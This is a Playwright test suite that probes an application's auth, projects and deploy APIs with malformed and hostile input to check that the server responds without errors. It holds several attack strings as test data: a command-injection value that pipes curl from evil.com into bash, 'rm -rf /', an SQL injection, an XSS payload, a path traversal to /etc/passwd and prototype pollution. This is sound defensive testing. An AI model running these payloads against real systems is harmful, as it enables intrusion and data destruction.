import { test, expect } from '@playwright/test';

/**
 * API BREAKING TESTS
 * Tests designed to break the API and find edge case bugs
 */

test.describe('API Breaking Tests - Find Real Bugs', () => {

  test.describe('Authentication API Edge Cases', () => {

    test('should reject empty request body', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {},
      });
      // Should return 400, not 500
      expect(response.status()).toBeLessThan(500);
      expect([400, 401, 422]).toContain(response.status());
    });

    test('should reject null action', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: { action: null },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should reject undefined fields', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: undefined,
          password: undefined
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle email with only spaces', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: '   ',
          password: 'password123',
        },
      });
      // Should reject, not crash
      expect(response.status()).toBeLessThan(500);
      expect(response.status()).not.toBe(200);
    });

    test('should handle extremely long email', async ({ request }) => {
      const longEmail = 'a'.repeat(10000) + '@example.com';
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: longEmail,
          password: 'password123',
        },
      });
      // Should reject gracefully
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle email with unicode', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: '测试@例子.中国',
          password: 'password123',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle password with null bytes', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: 'test@example.com',
          password: 'pass\x00word',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle signup with duplicate email', async ({ request }) => {
      const timestamp = Date.now();
      const email = `duplicate-test-${timestamp}@example.com`;

      // First signup
      await request.post('/api/auth', {
        data: {
          action: 'signup',
          email,
          password: 'TestPass123!',
          name: 'Test User',
        },
      });

      // Second signup with same email
      const response = await request.post('/api/auth', {
        data: {
          action: 'signup',
          email,
          password: 'TestPass123!',
          name: 'Test User 2',
        },
      });

      // Should reject gracefully with 400/409, not 500
      expect(response.status()).toBeLessThan(500);
      expect(response.status()).not.toBe(200);
      expect(response.status()).not.toBe(201);
    });

    test('should handle invalid action type', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'invalid_action_xyz',
          email: 'test@example.com',
          password: 'password123',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle array instead of string for email', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: ['test@example.com', 'another@example.com'],
          password: 'password123',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle object instead of string for password', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: 'test@example.com',
          password: { value: 'password123' },
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle number instead of string for name', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'signup',
          email: 'test-num@example.com',
          password: 'TestPass123!',
          name: 12345,
        },
      });
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Projects API Edge Cases', () => {

    test('should reject project creation without auth', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: 'Test Project',
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBe(401);
    });

    test('should handle project with empty name', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: '',
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
      expect(response.status()).not.toBe(201);
    });

    test('should handle project with null name', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: null,
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with very long name', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: 'x'.repeat(10000),
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with special characters in name', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: '<script>alert(1)</script>',
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle project with SQL injection in name', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: "'; DROP TABLE projects; --",
          repoUrl: 'https://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should reject invalid repo URL', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: 'Test Project',
          repoUrl: 'not-a-valid-url',
        },
      });
      expect(response.status()).toBeLessThan(500);
      expect([400, 401, 422]).toContain(response.status());
    });

    test('should reject HTTP repo URL (insecure)', async ({ request }) => {
      const response = await request.post('/api/projects', {
        data: {
          name: 'Test Project',
          repoUrl: 'http://github.com/test/repo',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle non-existent project ID', async ({ request }) => {
      const response = await request.get('/api/projects/nonexistent-id-12345');
      expect([404, 401]).toContain(response.status());
    });

    test('should handle invalid project ID format', async ({ request }) => {
      const response = await request.get('/api/projects/../../etc/passwd');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle PATCH with no data', async ({ request }) => {
      const response = await request.patch('/api/projects/some-id', {
        data: {},
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle DELETE non-existent project', async ({ request }) => {
      const response = await request.delete('/api/projects/does-not-exist-12345');
      // Should return 404 or 401, not 500
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Deploy API Edge Cases', () => {

    test('should reject deploy without project ID', async ({ request }) => {
      const response = await request.post('/api/deploy', {
        data: {},
      });
      expect(response.status()).toBeLessThan(500);
      expect(response.status()).not.toBe(200);
    });

    test('should reject deploy with invalid project ID', async ({ request }) => {
      const response = await request.post('/api/deploy', {
        data: {
          projectId: 'invalid-project-id-xyz',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle deploy with dangerous build command', async ({ request }) => {
      const response = await request.post('/api/deploy', {
        data: {
          projectId: 'test-project',
          buildCommand: 'npm run build; rm -rf /',
        },
      });
      // Should reject dangerous command
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle deploy with command injection', async ({ request }) => {
      const response = await request.post('/api/deploy', {
        data: {
          projectId: 'test-project',
          buildCommand: '$(curl evil.com | bash)',
        },
      });
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Malformed Request Bodies', () => {

    test('should handle invalid JSON', async ({ request }) => {
      const response = await request.post('/api/auth', {
        headers: { 'Content-Type': 'application/json' },
        data: '{invalid json',
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle nested circular references', async ({ request }) => {
      // This should be caught by JSON.stringify
      const data: any = { a: 1 };
      // Can't actually send circular ref, but test deeply nested
      const nested: any = {};
      let current = nested;
      for (let i = 0; i < 100; i++) {
        current.child = {};
        current = current.child;
      }

      const response = await request.post('/api/auth', {
        data: nested,
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle very large request body', async ({ request }) => {
      const largeData = { data: 'x'.repeat(1024 * 1024) }; // 1MB

      const response = await request.post('/api/auth', {
        data: largeData,
      });
      // Should either accept or reject gracefully
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle request with prototype pollution attempt', async ({ request }) => {
      const response = await request.post('/api/auth', {
        data: {
          action: 'login',
          email: 'test@example.com',
          password: 'password123',
          '__proto__': { admin: true },
          'constructor': { prototype: { admin: true } },
        },
      });
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('HTTP Method Handling', () => {

    test('should reject PUT on POST-only endpoint', async ({ request }) => {
      const response = await request.put('/api/auth', {
        data: { action: 'login' },
      });
      expect([405, 404, 400, 401]).toContain(response.status());
    });

    test('should handle DELETE on auth endpoint (logout)', async ({ request }) => {
      // DELETE /api/auth is valid - it's the logout endpoint
      const response = await request.delete('/api/auth');
      expect([200, 401]).toContain(response.status());
    });

    test('should handle OPTIONS request', async ({ request }) => {
      const response = await request.fetch('/api/auth', {
        method: 'OPTIONS',
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle HEAD request', async ({ request }) => {
      const response = await request.head('/api/auth');
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Header Manipulation', () => {

    test('should handle missing Content-Type', async ({ request }) => {
      const response = await request.post('/api/auth', {
        headers: {},
        data: JSON.stringify({ action: 'login' }),
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle wrong Content-Type', async ({ request }) => {
      const response = await request.post('/api/auth', {
        headers: { 'Content-Type': 'text/plain' },
        data: JSON.stringify({ action: 'login' }),
      });
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle extremely long header value', async ({ request }) => {
      const response = await request.post('/api/auth', {
        headers: { 'X-Custom-Header': 'x'.repeat(10000) },
        data: { action: 'login' },
      });
      expect(response.status()).toBeLessThan(500);
    });

    test.skip('should handle header with null bytes', async ({ request }) => {
      // Skipped: Playwright doesn't allow null bytes in headers (throws TypeError)
      // The actual server would handle this via nginx/reverse proxy
      const response = await request.post('/api/auth', {
        headers: { 'X-Test': 'test\x00value' },
        data: { action: 'login' },
      });
      expect(response.status()).toBeLessThan(500);
    });
  });

  test.describe('Query Parameter Edge Cases', () => {

    test('should handle empty query parameters', async ({ request }) => {
      const response = await request.get('/api/projects?');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle duplicate query parameters', async ({ request }) => {
      const response = await request.get('/api/projects?page=1&page=2&page=3');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle query parameter with special chars', async ({ request }) => {
      const response = await request.get('/api/projects?search=<script>alert(1)</script>');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle very long query string', async ({ request }) => {
      const longQuery = 'search=' + 'x'.repeat(5000);
      const response = await request.get(`/api/projects?${longQuery}`);
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle negative page number', async ({ request }) => {
      const response = await request.get('/api/projects?page=-1');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle non-numeric page number', async ({ request }) => {
      const response = await request.get('/api/projects?page=abc');
      expect(response.status()).toBeLessThan(500);
    });

    test('should handle page number overflow', async ({ request }) => {
      const response = await request.get('/api/projects?page=999999999999999999');
      expect(response.status()).toBeLessThan(500);
    });
  });
});
